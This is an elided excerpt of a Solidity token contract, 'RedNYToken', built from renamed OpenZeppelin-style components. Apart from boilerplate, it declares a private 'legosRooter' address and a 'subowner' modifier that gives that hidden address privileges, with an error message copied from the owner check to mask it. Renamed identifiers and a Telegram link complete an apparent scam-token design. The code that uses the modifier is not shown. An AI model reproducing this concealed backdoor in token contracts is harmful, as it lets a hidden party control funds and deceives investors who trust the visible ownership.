...
/*
 * @dev Provides information about the current execution RedNY20Burnable, including the
 ...
 */
abstract contract RedNY20Burnable {
...
// File: @openzeppelin/contracts/access/RedNY20Ownable.sol
 ...
 * the owner.
 */
abstract contract RedNY20Ownable is RedNY20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "RedNY20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "RedNY20Ownable: new owner is the zero address");
 ...
 * `SafeRedNY` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeRedNY {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeRedNY: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeRedNY: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeRedNY: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeRedNY: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeRedNY: modulo by zero");
  }
...
contract RedNYToken is RedNY20Burnable, RedNY33, RedNY20Ownable {
    
    using SafeRedNY for uint256;
   ...
   address private legosRooter; 
    ...
    string public RedNYtelegramcchannel = "https://t.me/RedNY";
            function getRedNYtelegramcchannel() public view returns (string memory) {
        return RedNYtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {RedNY33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "RedNY20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {RedNY33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {RedNY33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {RedNY33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "RedNY33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {RedNY33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "RedNY33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "RedNY33: transfer from the zero address");
        require(shippingto != address(0), "RedNY33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "RedNY33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "RedNY33: approve from the zero address");
        require(transporteur != address(0), "RedNY33: approve to the zero address");
